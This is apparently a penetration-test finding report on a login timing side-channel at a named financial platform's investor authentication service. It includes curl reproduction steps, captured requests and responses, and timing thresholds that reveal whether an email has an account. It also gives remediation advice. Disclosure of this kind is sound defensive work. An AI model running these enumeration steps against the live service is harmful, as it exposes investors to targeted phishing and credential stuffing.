# F023: Login Timing-Based Account Enumeration

## Summary

The login endpoint on investor-auth.spiko.io leaks account existence through a measurable timing side-channel. Existing accounts return responses approximately 564ms faster than non-existing accounts. The distributions do not overlap, enabling 100% accurate enumeration with a single request per email. Combined with no CAPTCHA on the login flow and generous rate limits (200/minute), automated bulk enumeration of investor accounts is feasible.

## Affected Endpoints

- `POST https://investor-auth.spiko.io/self-service/login?flow={flow_id}` (production)
- `POST https://investor-auth.staging.spiko.io/self-service/login?flow={flow_id}` (staging)

## Severity

**Low-Medium** (account enumeration on a financial platform)

## CVSS

AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3)

## OWASP Category

A07:2021 - Identification and Authentication Failures

## Technical Details

The Ory Kratos login flow returns identical error messages (id: 4000006, "The provided credentials are invalid...") for both existing and non-existing accounts. However, the server-side processing time differs measurably:

### Statistical Analysis (10 interleaved samples)

| Category | Mean | StDev | Min | Max |
|----------|------|-------|-----|-----|
| Existing (test@spiko.io) | 0.613s | 0.054s | 0.551s | 0.689s |
| Non-existing (xyznotreal999@spiko.io) | 1.177s | 0.058s | 1.112s | 1.244s |

**Delta: 0.564s. Distributions do not overlap.**

The non-existing email xyznotreal999@spiko.io uses the same @spiko.io domain as the existing account, ruling out any domain-based handling difference.

### Amplifying Factors

1. **No CAPTCHA on login flow** -- registration requires captcha_token, but login does not
2. **Generous rate limits** -- x-ratelimit-limit: 200 per 60-second window = 12,000 per hour
3. **No per-account lockout** -- no progressive delay or lockout after failed attempts for the same identifier
4. **Staging also affected** -- investor-auth.staging.spiko.io shows the same timing pattern

## Impact

An unauthenticated attacker can determine which email addresses have investor accounts on the Spiko platform. On a financial platform managing tokenized money market funds, this reveals who holds investments, enabling:

- Targeted phishing campaigns against confirmed investors
- Social engineering with knowledge of the target's financial activity
- Credential stuffing focused on confirmed accounts only

## Reproduction

### Step 1: Create a login flow

```
curl -s https://investor-auth.spiko.io/self-service/login/api
```

### Step 2: Submit with target email

```
curl -s -X POST 'https://investor-auth.spiko.io/self-service/login?flow={flow_id}' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  -d '{"method":"password","identifier":"TARGET_EMAIL","password":"x"}' \
  -w '\nTIME: %{time_total}'
```

### Step 3: Interpret timing

- Response in ~0.55-0.69s: account EXISTS
- Response in ~1.1-1.25s: account does NOT exist

## Proof Request/Response (Existing Account)

```
POST /self-service/login?flow=1c3df700-69e1-4271-b486-27990f64cbae HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json
Accept: application/json

{"method":"password","identifier":"test@spiko.io","password":"wrongpassword123"}
```

```
HTTP/2 400
date: Thu, 29 Oct 2026 23:24:24 GMT
content-type: application/json; charset=utf-8
x-ratelimit-limit: 20, 20;w=1, 200;w=60
x-ratelimit-remaining: 19

{"ui":{"messages":[{"id":4000006,"text":"The provided credentials are invalid, check for spelling mistakes in your password or username, email address, or phone number.","type":"error"}]}}

TIME_TOTAL: 0.605994
```

## Proof Request/Response (Non-Existing Account, Same Domain)

```
POST /self-service/login?flow=6162ae62-201d-4b2d-88a4-ac2bdc6b1b52 HTTP/2
Host: investor-auth.spiko.io
Content-Type: application/json
Accept: application/json

{"method":"password","identifier":"xyznotreal999@spiko.io","password":"wrongpassword123"}
```

```
HTTP/2 400
date: Thu, 29 Oct 2026 23:24:26 GMT
content-type: application/json; charset=utf-8
x-ratelimit-limit: 20, 20;w=1, 200;w=60
x-ratelimit-remaining: 19

{"ui":{"messages":[{"id":4000006,"text":"The provided credentials are invalid, check for spelling mistakes in your password or username, email address, or phone number.","type":"error"}]}}

TIME_TOTAL: 1.231440
```

## Remediation

1. Ensure Ory Kratos `security.account_enumeration.mitigate` is enabled and verify the timing implementation produces uniform response times
2. Add CAPTCHA (Cloudflare Turnstile is already used for registration) to the login flow after N failed attempts
3. Implement per-account progressive delay after repeated failures for the same identifier
